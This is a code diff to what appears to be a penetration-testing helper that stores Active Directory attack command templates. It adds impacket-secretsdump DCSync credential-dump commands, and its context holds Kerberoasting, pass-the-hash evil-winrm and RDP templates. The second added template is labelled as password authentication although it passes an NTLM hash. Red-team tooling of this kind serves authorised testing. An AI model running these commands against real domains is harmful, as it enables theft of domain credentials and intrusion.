@@ -31,6 +31,11 @@ const domainCommands: Command[] = [
   },
   {
     template:
+      "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}':'{password}'@'{targetHost}'",
+    authType: "password",
+  },
+  {
+    template:
       "xfreerdp /u:'{username}' /d:'{domain}' /p:'{password}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
     authType: "password",
   },
@@ -62,6 +67,11 @@ const domainCommands: Command[] = [
     template:
       "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}' -hashes '00:{ntlmHash}' -outputfile hashes.kerberoast",
     authType: "ntlmHash",
+  },
+  {
+    template:
+      "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
+    authType: "password",
   },
   {
     template: "evil-winrm -u '{username}' -H '{ntlmHash}' -i '{targetHost}'",
